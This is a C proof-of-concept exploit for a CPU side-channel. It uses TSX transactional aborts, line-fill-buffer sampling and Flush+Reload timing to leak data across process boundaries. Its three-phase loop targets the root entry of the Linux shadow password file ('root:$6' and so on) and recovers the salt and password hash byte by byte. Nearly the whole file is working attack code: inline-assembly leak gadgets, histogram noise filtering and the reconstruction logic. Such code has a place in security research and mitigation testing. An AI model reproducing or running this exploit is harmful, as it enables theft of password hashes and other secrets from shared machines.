#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <immintrin.h>

#include "util.h"

#define CONFIDENCE_SCORE 1
#define DEFAULT_URL "root:$6"
#define DEFAULT_URL_END ":0:9999"

// rounds before restarting to leak from the end
#define PHASE2_MAX_ROUNDS 15000000
// bytes to be leaked before starting in faster, more error prone phase 3
#define PHASE2_MIN_LEAKED_BYTES 3


unsigned char __attribute__((aligned(4096))) *buf;
unsigned char __attribute__((aligned(4096))) *buf2;
unsigned char __attribute__((aligned(4096))) *leak_mapping;
unsigned char hist[SECRET_LEN][BUF_SIZE];
unsigned char secret[SECRET_LEN+1] = "____________________________________________________________________________________________________________________________";


/*
 * Leak 2 byte with 6 byte mask. Used in phase 1.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
    "movq $0xffffffffffffff, %%r11\n"
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 6 byte mask: if hit then last 6 bytes == 0x0
    "movq %%rax, %%r12\n"           // copy to leak 2nd byte
    "andq %%r11, %%rax\n"           // zero out first byte
    "rol $0x10, %%rax\n"            // shift and rotate: 0x45000000000003->0x030000000045, 0x45000000000000->0x45
	"shl $0xc, %%rax\n"             // %%rax * 4096
	"movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // Leak 2nd byte in separate buffer
    "rol $0x10, %%r12\n"            // shift and rotate: 0x11450000000003->0x030000001145, 0x11450000000000->0x1145
    "shr $0x8, %%r12\n"             // cut off last byte (already leaked in first buffer)
    "shl $0xc, %%r12\n"             // %%r12 * 4096
    "movq (%%r12, %4), %%r12\n"     // copy from [%%r12+%4] -> touch value in reloadbuffer2

    // touch DUMMY_HIT (0x23 << 0xc) to fail fast from F+R
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}

/*
 * Leak reverse 1 byte with 7 byte mask. Used in phase 2.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse_single(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 8 byte mask: if hit then first 7 bytes == 0x0
    "shl $0xc, %%rax\n"             // %%rax * 4096
	"movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // touch DUMMY_HIT (0x23 << 0xc) to fail fast from F+R
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}

/*
 * Leak reverse 2 bytes with 6 byte mask. Used in phase 3.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
    "movq $0xffffffffffff00ff, %%r11\n"
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 8 byte mask: if hit then first 6 bytes == 0x0
    "movq %%rax, %%r12\n"           // copy to leak 2nd byte
    "shr $0x8, %%rax\n"             // cut off last byte: 0x3000000000001145->0x30000000000011, successful:0x0000000000001145->0x00000000000011
	"shl $0xc, %%rax\n"             // %%rax * 4096
	"movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // Leak 2nd byte in separate buffer
    "andq %%r11, %%r12\n"            // cut off second last byte (already leaked in first buffer)
    "shl $0xc, %%r12\n"             // %%r12 * 4096
    "movq (%%r12, %4), %%r12\n"     // copy from [%%r12+%4] -> touch value in reloadbuffer2

    // touch DUMMY_HIT (0x23 << 0xc) to fail fast from F+R
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}


int main(int argc, char* argv[]) {
    buf = (unsigned char *)mmap(0, BUF_TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    memset(buf, 1, BUF_TOTAL);

    buf2 = (unsigned char *)mmap(0, BUF_TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    memset(buf2, 1, BUF_TOTAL);

    leak_mapping = (unsigned char *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    memset(leak_mapping, 1, 4096);

    CACHE_MISS_THRESHOLD = detect_flush_reload_threshold(buf);
    printf("F+R threshold: %d\n", CACHE_MISS_THRESHOLD);

    flush_buffer(buf);
    flush_buffer(buf2);


    // prepare secret
    memcpy(secret, DEFAULT_URL, strlen(DEFAULT_URL));

    register uint64_t mask;
    register int index;
    int update, update2;
    int found_index;

    //
    // Phase 1: Leak 1st cache line
    //
    printf("\n\n############################################################\n\n");
    printf("Phase 1: Leak first cache line\n");
    printf("Secret: %s\n", secret);
    printf("\n############################################################\n\n");

    found_index = strlen(DEFAULT_URL);

    while(found_index < CACHE_LINE_LEN) {
        index = found_index - 6;
        // use the last 6 bytes to compare and filter out noise
        mask = *((uint64_t *)&secret[index]) & 0xffffffffffff;
        update = 0;
        update2 = 0;

        while(1) {
            // leak value into buffers
            tsxabort_leak_clflush(leak_mapping, buf2, index, mask, buf, buf2);

            // F+R -> mark found value in histogram
            for(int i=DUMMY_HIT; i<=TO; i++) {
                int time = time_flush_reload(buf + STRIDE * i);

                if(time < CACHE_MISS_THRESHOLD) {
                    hist[index][i]++;
                    if(i != DUMMY_HIT) {
                        printf("Buf 1: 0x%x=%c\n", i, i);
                        update = i;

                        // check for 2nd byte
                        for(int k=FROM; k<=TO; k++) {
                            time = time_flush_reload(buf2 + STRIDE * k);
                            if(time < CACHE_MISS_THRESHOLD) {
                                hist[index+1][k]++;
                                printf("Buf 2: 0x%x=%c\n", k, k);
                                update2 = k;
                            }
                        }
                    }
                    break;
                }
            }

            // check if F+R yields satisfying result > CONFIDENCE_SCORE
            if (update) {
                // filter out invalid chars -> more reliable
                if(!valid_char(update)) {
                    printf("Invalid char: %c\n", update);
                    update = 0;
                    update2 = 0;
                    continue;
                }
                if(update2) {
                    if(!valid_char(update2)) {
                        printf("Invalid char: %c\n", update2);
                        update = 0;
                        update2 = 0;
                        continue;
                    }
                }


                if(found_index < 62 && hist[index][update] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, found_index);
                    secret[found_index] = update;
                    found_index++;

                    if(found_index < 62 && update2 && hist[index+1][update2] >= CONFIDENCE_SCORE) {
                        printf("Found: 0x%x=%c, index: %d\n", update2, update2, found_index);
                        secret[found_index] = update2;
                        found_index++;
                    }

                    printf("%s\n", secret);
                    break;

                // last byte is a special case, wait until both are matching confidence score
                } else if(found_index == 62
                && hist[index][update] >= CONFIDENCE_SCORE
                && hist[index+1][update2] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, found_index);
                    secret[found_index] = update;
                    found_index++;
                    printf("Found: 0x%x=%c, index: %d\n", update2, update2, found_index);
                    secret[found_index] = update2;
                    found_index++;
                    break;
                }
            }
        }
    }


    //
    // Phase 2: Determine index and first PHASE2_MIN_LEAKED_BYTES bytes of string to leak reverse
    //

    printf("\n\n############################################################\n\n");
    printf("Phase 2: Determine index and first %d bytes of string to leak reverse\n", PHASE2_MIN_LEAKED_BYTES);
    printf("Secret: %s\n", secret);


    int salt_len = get_salt_len(secret);
    if(salt_len > 16) {
        printf("Ooops! Salt can't be longer than 16. Leak must be wrong. Try again!\n");
        return -1;
    }
    int offset = SECRET_LEN-SALT_MAX_LEN+salt_len;
    memcpy(secret+offset-strlen(DEFAULT_URL_END), DEFAULT_URL_END, strlen(DEFAULT_URL_END));
    secret[offset] = '\0';
    printf("Salt len: %d, line len=%d\n", salt_len, offset);
    printf("Secret: %s\n", secret);

    printf("\n############################################################\n\n");

    int leaked_bytes_reverse = 0;
    int rounds = 0;
    invalid_leaks_count = 0;
    found_index = offset;

    while(1) {
        index = found_index - 8;
        mask = *((uint64_t *)&secret[index]) & 0xffffffffffffff00;
        update = 0;
        rounds = 0;

        while(1) {
            // leak value into buffers
            tsxabort_leak_clflush_reverse_single(leak_mapping, buf2, index%CACHE_LINE_LEN, mask, buf, buf2);

            // F+R -> mark found value in histogram
            for(int i=DUMMY_HIT; i<=TO; i++) {
                int time = time_flush_reload(buf + STRIDE * i);

                if(time < CACHE_MISS_THRESHOLD) {
                    hist[index][i]++;
                    if(i != DUMMY_HIT) {
                        printf("Buf 1: 0x%x=%c\n", i, i);
                        update = i;
                    }
                    break;
                }
            }

            // check if F+R yields satisfying result > CONFIDENCE_SCORE
            if (update) {
                // filter out invalid chars -> more reliable
                if(!valid_char(update)) {
                    printf("Invalid char: %c\n", update);
                    update = 0;
                    continue;
                }

                if(hist[index][update] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, index);
                    secret[index] = update;
                    found_index--;
                    leaked_bytes_reverse++;

                    printf("%s\n", secret);
                    break;
                }
            }

            // check if it gets stuck and restart
            // getting stuck is caused by misaligned data but won't be our target row!
            if(++rounds >= PHASE2_MAX_ROUNDS) {
                // remember invalid leaks so we don't always have to wait PHASE2_MAX_ROUNDS
                if(leaked_bytes_reverse == 2) {
                    add_invalid_leak(secret[index+1], secret[index+2]);
                }
                printf("Reset to reverse leak starting from: %s\n", DEFAULT_URL_END);
                secret[index+1] = '_';
                if(leaked_bytes_reverse > 1) secret[index+2] = '_';
                leaked_bytes_reverse = 0;
                found_index = offset;
                break;
            }
        }

        // check for invalid leaked bytes
        if(!invalid_reverse_leak(secret, index, leaked_bytes_reverse)) {
            printf("Reset to reverse leak starting from: %s\n", DEFAULT_URL_END);
            secret[index] = '_';
            secret[index+1] = '_';
            leaked_bytes_reverse = 0;
            found_index = offset;
            continue;
        }
        if(leaked_bytes_reverse == PHASE2_MIN_LEAKED_BYTES) {
            break;
        }
    }


    //
    // Phase 3: Leak 2nd cache line reverse
    //

    printf("\n\n############################################################\n\n");
    printf("Phase 3: Leak 2nd cache line reverse\n");
    printf("Secret: %s\n", secret);
    printf("\n############################################################\n\n");

    found_index--; // we're leaking the first byte with an offset of -1

    while(index >= CACHE_LINE_LEN) {
        index = found_index - 8;
        mask = *((uint64_t *)&secret[index]) & 0xffffffffffff0000;
        update = 0;
        update2 = 0;

        while(1) {
            // leak value into buffers
            tsxabort_leak_clflush_reverse(leak_mapping, buf2, index%CACHE_LINE_LEN, mask, buf, buf2);

            // F+R -> mark found value in histogram
            for(int i=DUMMY_HIT; i<=TO; i++) {
                int time = time_flush_reload(buf + STRIDE * i);

                if(time < CACHE_MISS_THRESHOLD) {
                    hist[index+1][i]++;
                    if(i != DUMMY_HIT) {
                        printf("Buf 1: 0x%x=%c\n", i, i);

                        update = i;

                        // check for 2nd byte
                        for(int k=FROM; k<=TO; k++) {
                            time = time_flush_reload(buf2 + STRIDE * k);
                            if(time < CACHE_MISS_THRESHOLD) {
                                hist[index][k]++;
                                printf("Buf 2: 0x%x=%c\n", k, k);
                                update2 = k;
                            }
                        }
                    }
                    break;
                }
            }

            // check if F+R yields satisfying result > CONFIDENCE_SCORE
            if (update) {
                // filter out invalid chars -> more reliable
                if(!valid_char(update)) {
                    printf("Invalid char: %c\n", update);
                    update = 0;
                    update2 = 0;
                    continue;
                }
                if(update2) {
                    if(!valid_char(update2)) {
                        printf("Invalid char: %c\n", update2);
                        update = 0;
                        update2 = 0;
                        continue;
                    }
                }

                if(index > 64 && hist[index+1][update] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, index+1);
                    secret[index+1] = update;
                    found_index--;

                    if(index > 65 && update2 && hist[index][update2] >= CONFIDENCE_SCORE) {
                        printf("Found: 0x%x=%c, index: %d\n", update2, update2, index);
                        secret[index] = update2;
                        found_index--;
                    }

                    printf("%s\n", secret);
                    break;

                // last byte is a special case, wait until both are matching confidence score
                } else if(index == 64
                && hist[index+1][update] >= CONFIDENCE_SCORE
                && hist[index][update2] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, index+1);
                    secret[index+1] = update;
                    found_index--;
                    printf("Found: 0x%x=%c, index: %d\n", update2, update2, index);
                    secret[index] = update2;
                    found_index--;

                    // set index so that we break out of outer loop
                    index = found_index - 8;
                    break;
                }
            }
        }
    }

    printf("\n\n############################################################\n\n");
    printf("Leaked secret: \n%s\n", secret);

    return 0;
}
